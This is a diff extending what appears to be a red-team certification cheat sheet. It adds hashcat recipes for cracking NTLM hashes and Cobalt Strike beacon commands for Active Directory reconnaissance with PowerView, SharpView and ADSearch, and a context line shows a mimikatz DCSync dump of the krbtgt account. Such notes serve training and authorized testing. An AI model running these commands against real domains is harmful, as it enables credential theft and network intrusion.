@@ -450,3 +450,140 @@ beacon> mimikatz @lsadump::dcsync /user:DEV\krbtgt
 
 ## Wordlists
 
+### Rules
+
+```bash
+hashcat.exe -a 0 -m 1000 ntlm.txt rockyou.txt -r rules\add-year.rule
+# or -r /usr/share/hashcat/rules/add-months.rule -r /usr/share/hashcat/rules/add-year.rule
+```
+
+### Masks
+
+```bash
+? | Charset
+===+=========
+l | abcdefghijklmnopqrstuvwxyz
+u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
+d | 0123456789
+h | 0123456789abcdef
+H | 0123456789ABCDEF
+s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
+a | ?l?u?d?s
+b | 0x00 - 0xff
+```
+
+```bash
+hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d
+```
+
+`-1 ?d?s` defines a custom charset (digits and specials)
+
+`?u?l?l?l?l?l?l?l?1` is the mask, where ?1 is the custom charset.
+
+```bash
+# Custom
+hashcat.exe -a 3 -m 1000 ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
+```
+
+Also you can write your file.hcmask
+
+```bash
+ZeroPointSecurity?d
+ZeroPointSecurity?d?d
+ZeroPointSecurity?d?d?d
+ZeroPointSecurity?d?d?d?d
+
+# or 
+?d?s,?u?l?l?l?l?1
+?d?s,?u?l?l?l?l?l?1
+?d?s,?u?l?l?l?l?l?l?1
+?d?s,?u?l?l?l?l?l?l?l?1
+?d?s,?u?l?l?l?l?l?l?l?l?1
+```
+
+### Combinator
+
+```bash
+# Ejemplo output pass1 pass2. pass1-pass2!
+hashcat.exe -a 1 -m 1000 ntlm.txt list1.txt list2.txt -j $- -k $!
+```
+
+### Hybrid
+
+`-a 6` specifies the hybrid wordlist + mask mode
+
+`?d?d?d?d` is the mask.
+
+```bash
+hashcat.exe -a 6 -m 1000 ntlm.txt list.txt ?d?d?d?d
+```
+
+### Kwprocessor
+
+```cmd
+kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o keywalk.txt
+```
+
+## Domain Recon
+
+- https://github.com/PowerShellMafia/PowerSploit
+- https://github.com/tevora-threat/SharpView
+
+### PowerView CheatSheet o SharpView
+
+```bash
+beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
+execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-Domain
+```
+
+```bash
+# Returns a domain object for the current domain or the domain specified with -Domain
+beacon> powershell Get-Domain
+
+# Returns the domain controllers for the current or specified domain.
+beacon> powershell Get-DomainController | select Forest, Name, OSVersion | fl
+
+# Returns all domains for the current forest or the forest specified by -Forest.
+beacon> powershell Get-ForestDomain
+
+# Returns the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.
+beacon> powershell Get-DomainPolicyData | select -expand SystemAccess
+
+# Return all (or specific) user(s). To only return specific properties, use -Properties. By default, all user objects for the current domain are returned, use -Identity to return a specific user.
+# If you run this command without the -Identity parameter, prepare to wait a while for all the data to return.
+beacon> powershell Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl
+
+# Return all computers or specific computer objects.
+beacon> powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
+
+# Search for all organization units (OUs) or specific OU objects.
+beacon> powershell Get-DomainOU -Properties Name | sort -Property Name
+
+# Return all domain groups or specific domain group objects.
+beacon> powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
+
+# Return the members of a specific domain group.
+beacon> powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
+
+# Return all Group Policy Objects (GPOs) or specific GPO objects. To enumerate all GPOs that are applied to a particular machine, use -ComputerIdentity.
+beacon> powershell Get-DomainGPO -Properties DisplayName | sort -Property DisplayName
+
+# Returns all GPOs that modify local group membership through Restricted Groups or Group Policy Preferences.
+beacon> powershell Get-DomainGPOLocalGroup | select GPODisplayName, GroupName
+
+#Enumerates the machines where a specific domain user/group is a member of a specific local group. 
+beacon> powershell Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl
+
+# Return all domain trusts for the current or specified domain.
+beacon> powershell Get-DomainTrust
+```
+
+### AdSearch
+
+You can add `--json`, `--full` and `--attributes`
+
+```bash
+beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "objectCategory=user"
+beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"
+beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=MS SQL Admins))" --attributes cn,member
+```
